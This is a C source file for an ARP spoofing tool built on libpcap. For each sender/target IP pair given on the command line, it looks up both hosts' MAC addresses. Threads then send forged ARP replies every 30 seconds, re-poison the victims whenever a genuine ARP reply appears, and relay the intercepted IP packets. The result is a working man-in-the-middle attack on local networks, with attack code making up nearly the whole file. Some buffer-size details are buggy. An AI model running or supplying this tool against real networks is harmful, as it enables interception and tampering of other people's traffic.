#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <pthread.h>

#define HWTYPE_ETHER   0x01
#define IP_LENGTH	   0x04
#define ETHER_LENGTH   0x06
#define ETHERTYPE_IP   0x0800
#define ETHERTYPE_ARP  0x0806

typedef struct packet_info{
	char dev[10];
	in_addr my_ip[4];
	in_addr src_ip[4];
	in_addr dst_ip[4];
	u_char myMac[6];
	u_char srcMac[6];
	u_char dstMac[6];
} packet_info;

typedef struct all_info{
	char dev[10];
	in_addr my_ip[4];
	u_char myMac[6];
	in_addr *all_src_ip;
	in_addr *all_dst_ip;
	u_char **all_srcMac;
	u_char **all_dstMac;
	int session_n;
} all_info;

void usage()
{
	printf("usage:	arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("ex : 	arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void printmac(const char *h, u_char *srcMac)
{
	printf("%s: %02x:%02x:%02x:%02x:%02x:%02x\n", h,
		srcMac[0], srcMac[1], srcMac[2],
		srcMac[3], srcMac[4], srcMac[5]);	
}

void printip(const char *h, u_char *ip)
{
	printf("%s: %u.%u.%u.%u\n", h, ip[0], ip[1], ip[2], ip[3]);
}

void GetMyInfo(char* dev,unsigned char *my_mac, struct in_addr *my_ip){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    strcpy(s.ifr_name, dev);
    if (ioctl(fd, SIOCGIFHWADDR, &s)) {
        printf("Can't Get Mac Address!!\n");
        exit(1);
    }
    memcpy(my_mac, s.ifr_addr.sa_data, 6);
    if (ioctl(fd, SIOCGIFADDR, &s)) {
        printf("Can't Get IP Address!!\n");
        exit(1);
    }
    memcpy(my_ip, (const void*)&(((sockaddr_in *)&s.ifr_addr)->sin_addr), 4);
}

void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, u_char *srcMac, u_char *dstMac, u_short opcode, const char *message)
{	
	unsigned char packet[ETHERMTU];
	struct ether_header *eth_h;
	struct ether_arp *arp_h;

	memset(packet, 0, ETHERMTU);

	eth_h = (struct ether_header*)packet;
	memcpy(eth_h->ether_dhost, dstMac, 6);
	memcpy(eth_h->ether_shost, srcMac, 6);
	eth_h->ether_type = htons(ETHERTYPE_ARP);
	
	arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	arp_h->ea_hdr.ar_hrd = htons(HWTYPE_ETHER);
	arp_h->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arp_h->ea_hdr.ar_hln = ETHER_LENGTH;
	arp_h->ea_hdr.ar_pln = IP_LENGTH;
	arp_h->ea_hdr.ar_op = htons(opcode);
	memcpy(arp_h->arp_sha, srcMac, 6);
	memcpy(arp_h->arp_spa, src_ip, 4);

	if(!memcmp(dstMac, "\xff\xff\xff\xff\xff\xff", 6))
		memcpy(arp_h->arp_tha, "\x00\x00\x00\x00\x00\x00", 6);
	else
		memcpy(arp_h->arp_tha, dstMac, 6);
	memcpy(arp_h->arp_tpa, dst_ip, 4);
	if(pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp)))
		printf("%s SendPacket Failed\n", message);
	else
		printf("%s SendPacket Success!\n", message);
}

void GetTargetMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *srcMac, unsigned char *dstMac)
{
	unsigned char broadcast[7] = "\xff\xff\xff\xff\xff\xff";

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
	  exit(1);
	}

  	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;

	    const u_char* packet;
	    unsigned short eth_type;

	    int res = pcap_next_ex(handle, &header, &packet);

	    if (res == 0)
	   	{
	   		SendPacket(handle, src_ip, dst_ip, srcMac, broadcast, 1, "GetMac");
	   		continue;
	   	}

	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	      if(!memcmp(dst_ip, arp_h->arp_spa, 4))
	      {
	      	memcpy(dstMac, arp_h->arp_sha, 6);
	      	pcap_close(handle);
	      	return;
	      }
    	}
    	else
    	{
    		if (pcap_sendpacket(handle, packet, sizeof(packet)))
    			printf("Packet Relay Success!!\n");
    		else
    			printf("Packet Relay Failed!!\n");
    	}
  	}
}

void* ARPInfection_regular(void *pinfo)
{
	packet_info info;
	memcpy(&info, pinfo, sizeof(packet_info));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(info.dev, BUFSIZ, 1, 1000, errbuf);
	
	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", info.dev, errbuf);
	  exit(1);
	}

	while(true)
	{
		SendPacket(handle, info.dst_ip, info.src_ip, info.myMac, info.srcMac, 2, "Regular");
		sleep(30);
	}

	pcap_close(handle);
}

void* ARPInfection_irregular(void *ainfo)
{
	all_info *info = (all_info*)ainfo;
	struct ether_header *eth_h;
	struct ether_arp *arp_h;
	char relay_packet[ETHERMTU];
	int packet_size;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(info->dev, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL) {
	  fprintf(stderr, "couldn't open device %s: %s\n", info->dev, errbuf);
	  exit(1);
	}

	while (true) {
		struct pcap_pkthdr* header;
		struct ether_header* eth_h;
	    struct ether_arp* arp_h;
	    struct ip* ip_h;

	    const u_char* packet;
	    unsigned short eth_type;

	    int res = pcap_next_ex(handle, &header, &packet);
	    int flag;

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;

	    eth_h = (struct ether_header*)packet;
	    eth_type = htons(eth_h->ether_type);
	    packet_size = header->caplen;
	    flag = 0;

	    if (eth_type == ETHERTYPE_ARP)
	    {
	      arp_h = (struct ether_arp*)(packet + sizeof(struct ether_header));
	      for(int i = 0; i < info->session_n; i++) {
	      	if(!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
	      		!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){
	 
	      		SendPacket(handle, &(info->all_dst_ip[i]), &(info->all_src_ip[i]),
	      			info->myMac, info->all_srcMac[i], 2, "Irregular");
	      		flag = 1;
	      		break;
	      	}
	  	  }
	  	  if(flag)
	  	  	continue;
	    }
    	
    	if (eth_type == ETHERTYPE_IP)
    	{	
	    	ip_h = (struct ip*)(packet + sizeof(struct ether_header));
	
	    	for(int i = 0; i < info->session_n; i++)
	    	{
				if(!memcmp(eth_h->ether_shost, info->all_srcMac[i], 6) && !memcmp(eth_h->ether_dhost, info->myMac, 6)
					&& ((*(int*)&ip_h->ip_dst) != (*(int*)&info->my_ip)))
				{
					memcpy(eth_h->ether_shost, info->myMac, 6);
					memcpy(eth_h->ether_dhost, info->all_dstMac[i], 6);
					break;
				}
			}
    	}
		pcap_sendpacket(handle, packet, packet_size);
    }
}

int main(int argc, char *argv[])
{
	pthread_t *threads;
	pthread_t athread;
	char *dev;
	struct in_addr *sender_ip;
	struct in_addr *target_ip;
	struct in_addr LocalIP;
	unsigned char LocalMac[6];
	int session_n = (argc - 2) / 2;
	int *thr_id;
	int athr_id;
	packet_info *pinfo;
	all_info ainfo;

	if((argc < 3) || (argc % 2))
	{
		usage();
		return 0;
	}

	dev = argv[1];
	sender_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	target_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	ainfo.all_src_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	ainfo.all_dst_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
	ainfo.all_srcMac = (u_char**)malloc(session_n * sizeof(u_char*));
	for(int i = 0; i < session_n; i++)
		ainfo.all_srcMac[i] = (u_char*)malloc(6 * sizeof(u_char));
	ainfo.all_dstMac = (u_char**)malloc(session_n * sizeof(u_char*));
	for(int i = 0; i < session_n; i++)
		ainfo.all_dstMac[i] = (u_char*)malloc(6 * sizeof(u_char));

	for(int i = 0; i < session_n; i++)
	{
		inet_aton(argv[2*i + 2], &(sender_ip[i]));
		inet_aton(argv[2*i + 3], &(target_ip[i]));
	}

	threads = (pthread_t*)malloc(session_n * sizeof(pthread_t));
	pinfo = (packet_info*)malloc(session_n * sizeof(packet_info));
	thr_id = (int*)malloc(session_n * sizeof(int));

	GetMyInfo(dev, LocalMac, &LocalIP);

	memcpy(ainfo.dev, dev, sizeof(dev));
	memcpy(ainfo.my_ip, (in_addr*)&LocalIP, 4);
	memcpy(ainfo.myMac, LocalMac, 6);
	ainfo.session_n = session_n;

	for(int i = 0; i < session_n; i++)
	{
		memcpy(&ainfo.all_src_ip[i], (in_addr*)&sender_ip[i], 4);
		memcpy(&ainfo.all_dst_ip[i], (in_addr*)&target_ip[i], 4);
		GetTargetMac(ainfo.dev, &ainfo.all_src_ip[i], &ainfo.all_dst_ip[i], ainfo.myMac, ainfo.all_dstMac[i]);
		GetTargetMac(ainfo.dev, &ainfo.all_dst_ip[i], &ainfo.all_src_ip[i], ainfo.myMac, ainfo.all_srcMac[i]);
	}

	for(int i = 0; i < session_n; i++)
	{
		memcpy(pinfo[i].dev, dev, sizeof(dev));
		memcpy(pinfo[i].my_ip, (in_addr*)&LocalIP, 4);
		memcpy(pinfo[i].src_ip, (in_addr*)&ainfo.all_src_ip[i], 4);
		memcpy(pinfo[i].dst_ip, (in_addr*)&ainfo.all_dst_ip[i], 4);
		memcpy(pinfo[i].myMac, LocalMac, 6);
		memcpy(pinfo[i].srcMac, ainfo.all_srcMac[i], 6);
		memcpy(pinfo[i].dstMac, ainfo.all_dstMac[i], 6);
	}

	athr_id = pthread_create(&athread, NULL, ARPInfection_irregular, (void*)&ainfo);
	
	
	if (athr_id < 0)
	{
		perror("athread create error!!\n");
		exit(1);
	}
	else
		printf("athread create success!!\n");
	
	
	for(int i = 0; i < session_n; i++)
	{
		thr_id[i] = pthread_create(&threads[i], NULL, ARPInfection_regular, (void*)&pinfo[i]);
		if (thr_id[i] < 0)
		{
			perror("thread create error!!\n");
			exit(1);
		}
		else
			printf("thread create success!!\n");
	}

	for(int i = 0; i < session_n; i++)
		pthread_join(threads[i], NULL);
	
	pthread_join(athread, NULL);

	free(threads);
	free(pinfo);
	free(thr_id);
	free(sender_ip);
	free(ainfo.all_src_ip);
	free(ainfo.all_dst_ip);
	for (int i = 0; i < session_n; i++)
	{
		free(ainfo.all_srcMac[i]);
		free(ainfo.all_dstMac[i]);
	}
	free(ainfo.all_srcMac);
	free(ainfo.all_dstMac);
}
